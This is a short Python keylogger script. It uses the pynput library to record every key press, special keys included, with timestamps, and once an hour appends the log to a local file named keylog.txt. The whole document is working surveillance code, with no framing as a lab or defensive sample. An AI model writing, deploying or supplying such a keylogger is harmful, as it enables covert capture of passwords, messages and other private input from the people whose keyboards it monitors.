from pynput import keyboard
import time
from datetime import datetime

# Constants
LOG_FILE = "keylog.txt"
LOG_INTERVAL = 60 * 60  # 60 minutes in seconds

# Variables
start_time = time.time()
log_entries = []

def on_press(key):
    try:
        # Log the key press
        log_entries.append(f"[{get_timestamp()}] Key pressed: {key.char}\n")
    except AttributeError:
        # Log special keys (e.g., Shift, Enter, etc.)
        log_entries.append(f"[{get_timestamp()}] Special key pressed: {key}\n")

def on_release(key):
    # Stop the listener if the ESC key is pressed
    if key == keyboard.Key.esc:
        return False

def get_timestamp():
    now = datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

def save_log_entries():
    with open(LOG_FILE, "a") as file:
        file.writelines(log_entries)
    log_entries.clear()

# Create a listener for key presses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    while True:
        listener.join(timeout=1)  # Check for events every second

        elapsed_time = time.time() - start_time
        if elapsed_time >= LOG_INTERVAL:
            save_log_entries()
            start_time = time.time()
